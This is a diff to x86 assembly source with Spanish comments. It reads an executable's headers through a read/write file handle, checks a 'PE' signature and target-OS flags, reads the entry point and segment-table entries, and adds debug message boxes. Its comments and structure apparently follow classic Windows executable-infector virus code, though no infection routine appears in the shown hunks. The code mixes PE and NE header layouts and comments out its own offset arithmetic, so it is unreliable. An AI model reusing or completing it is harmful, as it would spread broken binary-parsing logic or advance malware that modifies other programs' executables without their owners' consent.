@@ -281,22 +281,35 @@ FILE_OK:
        ; Mover el puntero del archivo a la posición 80h desde el inicio del archivo
 
 
-       mov edi, NEW_HDR2
+       mov edi, NEW_HDR
        mov ecx,NEW_HDR_SIZE
 
        call FILE_READ
-       invoke MessageBoxA, HWND_DESKTOP,NEW_HDR2 ,notify_msg, MB_OK
+       invoke MessageBoxA, HWND_DESKTOP,NEW_HDR ,notify_msg, MB_OK
 
 
-      cmp DWORD[NEW_HDR2],"PE" ;see if this is ’NE’ new header ID
+       mov ecx,dword[e_lfanew]
+       add ecx,22h ;Segment table
+       mov ebx,dword[fileHandle] ; Guardar el puntero al archivo en ebx
+
+       call FILE_SEEK_ST
+
+      mov edi,HDR_SEGMENT_TABLE
+      mov ecx,8 ;qword
+
+     call FILE_READ ;ok, read EXE header
+     ;mov edx,DWORD [NEW_HDR+3CH] ;ok, put offset to new header in dx  ;pe gui offset
+     invoke MessageBoxA, HWND_DESKTOP,dword[HDR_SEGMENT_TABLE] ,notify_msg, MB_OK
+
+      cmp DWORD[NEW_HDR],"PE" ;see if this is ’NE’ new header ID
       jnz SHORT FN1 ;nope, not a Windows EXE!
 
 
 
-      mov al,byte[NEW_HDR2+36H] ;get target OS flags
+      mov al,byte[NEW_HDR+36H] ;get target OS flags
       and al,2 ;see if target OS = windows
       jz SHORT FOK2 ;ok, go on  ;jnz SHORT FOK2 ;ok, go on
-      invoke MessageBoxA, HWND_DESKTOP,dword[NEW_HDR2+36H] ,notify_msg, MB_OK
+      ;invoke MessageBoxA, HWND_DESKTOP,dword[NEW_HDR+36H] ,notify_msg, MB_OK
        FN1: jmp FOK_ERROR1 ;else exit
        ;If we get here, then condition (1) is fulfilled.
        FOK2:
@@ -313,8 +326,8 @@ FILE_OK:
         mov ebx,dword[fileHandle]
 
         call FILE_READ
-        invoke MessageBoxA, HWND_DESKTOP,EntryPoint,notify_msg, MB_OK
-        invoke MessageBoxA, HWND_DESKTOP,next_msg ,notify_msg, MB_OK
+        invoke MessageBoxA, HWND_DESKTOP,dword[EntryPoint],notify_msg, MB_OK
+
 
         ;mov edx,DWORD[NEW_HDR+16H] ;get initial cs
 
@@ -490,17 +503,20 @@ US4: mov dword[TEMP],eax ;adjust segment loc in memory
 ;This routine goes to the segment table entry number specified in dx in the
 ;file and reads it into the TEMP buffer. dx=1 is the first entry!
 GET_SEG_ENTRY:
+
  push ebx
  push esi
  push edi
 
 
- dec edx
- mov cl,3
- shl edx,cl
- add edx,dword[NH_OFFSET]
+; dec edx
+; mov cl,3
+; shl edx,cl
+ mov edx,dword[NH_OFFSET]
+
  add edx,dword[NEW_HDR+22H] ;dx=ofs of seg table entry requested
  mov ecx,edx
+
 ; call FILE_SEEK_ST ;go to specified table entry
  invoke fseek, [fileHandle],ecx, 0
 
@@ -511,8 +527,9 @@ GET_SEG_ENTRY:
 
  mov ebx,dword[fileHandle]
  mov edi, edx
- xor ecx,ecx
- mov cl,8
+; xor ecx,ecx
+; mov cl,8
+  mov ecx,8
  call FILE_READ ;read table entry into disk buf
 
 
@@ -1002,6 +1019,7 @@ LOG_SEC DD ? ;logical sector size for program
     NEW_HDR2 DW 40h dup (0) ;space to put new exe header in
     e_lfanew  DD ?
     EntryPoint  DD ?
+    HDR_SEGMENT_TABLE db 0,0,0,0,0,0,0,0
     TEMP DB DATABUF_SIZE dup (?) ;temporary data storage
     ;file params
     DesiredAccess dd GENERIC_READ or GENERIC_WRITE
